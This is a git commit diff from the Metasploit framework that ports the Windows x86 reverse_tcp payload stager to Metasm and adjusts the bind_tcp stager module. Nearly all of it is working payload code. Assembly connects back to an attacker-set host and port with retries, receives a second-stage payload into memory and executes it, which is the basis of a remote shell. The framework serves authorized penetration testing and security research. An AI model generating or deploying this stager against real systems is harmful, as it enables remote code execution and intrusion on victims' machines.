e7a4ee637abbc61dbbfd53aca82d18e4ebbb1730
HD Moore <hd_moore@rapid7.com>
2015-03-16 20:11:05 -0500

    Port windows reverse_tcp|bind_tcp to Metasm, add error handling
    Conflicts:
    	lib/msf/core/payload/windows/bind_tcp.rb
    	modules/payloads/stagers/windows/bind_tcp.rb
    
    Cherry-picked form @hmoore-r7's repo.

--- lib/msf/core/payload/windows/reverse_tcp.rb
+++ lib/msf/core/payload/windows/reverse_tcp.rb
@@ -9,16 +9,23 @@ module Msf
 
 ###
 #
-# Complex bindtcp payload generation for Windows ARCH_X86
+# Complex reverse_tcp payload generation for Windows ARCH_X86
 #
 ###
 
 
-module Payload::Windows::BindTcp
+module Payload::Windows::ReverseTcp
 
   include Msf::Payload::Windows
   include Msf::Payload::Windows::BlockApi
   include Msf::Payload::Windows::Exitfunk
+
+  #
+  # Register reverse_tcp specific options
+  #
+  def initialize(*args)
+    super
+  end
 
   #
   # Generate the first stage
@@ -26,31 +33,35 @@ module Payload::Windows::BindTcp
   def generate
     # Generate the simple version of this stager if we don't have enough space
     if self.available_space.nil? || required_space > self.available_space
-      return generate_bind_tcp(
-        port: datastore['LPORT']
+      return generate_reverse_tcp(
+        port: datastore['LPORT'],
+        host: datastore['LHOST'],
+        retry_count: datastore['ReverseConnectRetries'],
       )
     end
 
     conf = {
+      host: datastore['LHOST'],
       port: datastore['LPORT'],
+      retry_count: datastore['ReverseConnectRetries'],
       exitfunk: datastore['EXITFUNC'],
       reliable: true
     }
 
-    generate_bind_tcp(conf)
+    generate_reverse_tcp(conf)
   end
 
   #
   # Generate and compile the stager
   #
-  def generate_bind_tcp(opts={})
+  def generate_reverse_tcp(opts={})
     combined_asm = %Q^
       cld                    ; Clear the direction flag.
       call start             ; Call start, this pushes the address of 'api_call' onto the stack.
       #{asm_block_api}
       start:
         pop ebp
-      #{asm_bind_tcp(opts)}
+      #{asm_reverse_tcp(opts)}
     ^
     Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
   end
@@ -65,10 +76,8 @@ module Payload::Windows::BindTcp
     # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
     space += 31
 
-    # EXITFUNK unset will still call ExitProces, which adds 7 bytes (accounted for above)
-
-    # Reliability checks add 4 bytes for the first check, 5 per recv check (2)
-    space += 14
+    # Reliability adds 10 bytes for recv error checks
+    space += 10
 
     # The final estimated size
     space
@@ -81,17 +90,19 @@ module Payload::Windows::BindTcp
   # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
   # @option opts [Bool] :reliable Whether or not to enable error handling code
   #
-  def asm_bind_tcp(opts={})
+  def asm_reverse_tcp(opts={})
 
+    retry_count  = [opts[:retry_count].to_i, 1].max
     reliable     = opts[:reliable]
     encoded_port = "0x%.8x" % [opts[:port].to_i,2].pack("vn").unpack("N").first
+    encoded_host = "0x%.8x" % Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
 
     asm = %Q^
       ; Input: EBP must be the address of 'api_call'.
-      ; Output: EDI will be the newly connected clients socket
+      ; Output: EDI will be the socket for the connection to the server
       ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
 
-      bind_tcp:
+      reverse_tcp:
         push 0x00003233        ; Push the bytes 'ws2_32',0,0 onto the stack.
         push 0x5F327377        ; ...
         push esp               ; Push a pointer to the "ws2_32" string on the stack.
@@ -105,16 +116,11 @@ module Payload::Windows::BindTcp
         push 0x006B8029        ; hash( "ws2_32.dll", "WSAStartup" )
         call ebp               ; WSAStartup( 0x0190, &WSAData );
 
-        push 8
-        pop ecx
-      push_8_loop:
-        push eax               ; if we succeed, eax will be zero, push it 8 times for later ([1]-[8])
-        loop push_8_loop
-
-                               ; push zero for the flags param [8]
-                               ; push null for reserved parameter [7]
-                               ; we do not specify a WSAPROTOCOL_INFO structure [6]
-                               ; we do not specify a protocol [5]
+      create_socket:
+        push eax               ; if we succeed, eax will be zero, push zero for the flags param.
+        push eax               ; push null for reserved parameter
+        push eax               ; we do not specify a WSAPROTOCOL_INFO structure
+        push eax               ; we do not specify a protocol
         inc eax                ;
         push eax               ; push SOCK_STREAM
         inc eax                ;
@@ -123,41 +129,51 @@ module Payload::Windows::BindTcp
         call ebp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
         xchg edi, eax          ; save the socket for later, don't care about the value of eax after this
 
-                               ; bind to 0.0.0.0, pushed earlier [4]
-
+      set_address:
+        push #{retry_count}    ; retry counter
+        push #{encoded_host}   ; host in little-endian format
         push #{encoded_port}   ; family AF_INET and port number
-        mov esi, esp           ; save a pointer to sockaddr_in struct
-        push 16                ; length of the sockaddr_in struct (we only set the first 8 bytes as the last 8 are unused)
-        push esi               ; pointer to the sockaddr_in struct
-        push edi               ; socket
-        push 0x6737DBC2        ; hash( "ws2_32.dll", "bind" )
-        call ebp               ; bind( s, &sockaddr_in, 16 );
+        mov esi, esp           ; save pointer to sockaddr struct
+
+      try_connect:
+        push 16                ; length of the sockaddr struct
+        push esi               ; pointer to the sockaddr struct
+        push edi               ; the socket
+        push 0x6174A599        ; hash( "ws2_32.dll", "connect" )
+        call ebp               ; connect( s, &sockaddr, 16 );
+
+        test eax,eax           ; non-zero means a failure
+        jz connected
+
+      handle_failure:
+        dec dword [esi+8]
+        jnz try_connect
       ^
 
-      # Check for a failed bind() call
-      if reliable
+      if opts[:exitfunk]
         asm << %Q^
-            test eax,eax
-            jnz failure
+          failure:
+            call exitfunk
+          ^
+      else
+        asm << %Q^
+          failure:
+            push 0x56A2B5F0        ; hardcoded to exitprocess for size
+            call ebp
           ^
       end
+      # TODO: Rewind the stack, free memory, try again
+=begin
+      if opts[:reliable]
+        asm << %Q^
+           reconnect:
+
+          ^
+      end
+=end
 
       asm << %Q^
-                               ; backlog, pushed earlier [3]
-        push edi               ; socket
-        push 0xFF38E9B7        ; hash( "ws2_32.dll", "listen" )
-        call ebp               ; listen( s, 0 );
-
-                               ; we set length for the sockaddr struct to zero, pushed earlier [2]
-                               ; we dont set the optional sockaddr param, pushed earlier [1]
-        push edi               ; listening socket
-        push 0xE13BEC74        ; hash( "ws2_32.dll", "accept" )
-        call ebp               ; accept( s, 0, 0 );
-
-        push edi               ; push the listening socket to close
-        xchg edi, eax          ; replace the listening socket with the new connected socket for further comms
-        push 0x614D6E75        ; hash( "ws2_32.dll", "closesocket" )
-        call ebp               ; closesocket( s );
+      connected:
 
       recv:
         ; Receive the size of the incoming second stage...
@@ -170,6 +186,7 @@ module Payload::Windows::BindTcp
       ^
 
       # Check for a failed recv() call
+      # TODO: Try again by jmping to reconnect
       if reliable
         asm << %Q^
             cmp eax, 0
@@ -200,6 +217,7 @@ module Payload::Windows::BindTcp
       ^
 
       # Check for a failed recv() call
+      # TODO: Try again by jmping to reconnect
       if reliable
         asm << %Q^
             cmp eax, 0
@@ -214,22 +232,9 @@ module Payload::Windows::BindTcp
         ret                    ; return into the second stage
         ^
 
-      if reliable
-        if opts[:exitfunk]
-          asm << %Q^
-            failure:
-
-            ^
-          asm << asm_exitfunk(opts)
-        else
-          asm << %Q^
-            failure:
-              push 0x56A2B5F0        ; hardcoded to exitprocess for size
-              call ebp
-            ^
-        end
+      if opts[:exitfunk]
+        asm << asm_exitfunk(opts)
       end
-
     asm
   end
 
--- modules/payloads/stagers/windows/bind_tcp.rb
+++ modules/payloads/stagers/windows/bind_tcp.rb
@@ -7,31 +7,27 @@
 require 'msf/core'
 require 'msf/core/payload/windows/bind_tcp'
 require 'msf/core/handler/bind_tcp'
-
+require 'msf/core/payload/windows/bind_tcp'
 
 module Metasploit4
 
   CachedSize = 285
 
+  include Msf::Payload::Stager
   include Msf::Payload::Windows::BindTcp
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'        => 'Bind TCP Stager',
-      'Description' => 'Listen for a connection',
-      'Author'      => ['hdm', 'skape', 'sf'],
-      'License'     => MSF_LICENSE,
-      'Platform'    => 'win',
-      'Arch'        => ARCH_X86,
-      'Handler'     => Msf::Handler::BindTcp,
-      'Convention'  => 'sockedi',
-      'Stager'      => { 'RequiresMidstager' => false }
+      'Name'          => 'Bind TCP Stager',
+      'Description'   => 'Listen for a connection',
+      'Author'        => ['hdm', 'skape', 'sf'],
+      'License'       => MSF_LICENSE,
+      'Platform'      => 'win',
+      'Arch'          => ARCH_X86,
+      'Handler'       => Msf::Handler::BindTcp,
+      'Convention'    => 'sockedi',
+      'Stager'        => { 'RequiresMidstager' => false }
       ))
-
-    # TODO: find out if this is the best way to do it.
-    register_options([
-      OptPort.new('LPORT', [ true, "The local listener port", 4444 ])
-    ], self.class)
   end
 
   def generate
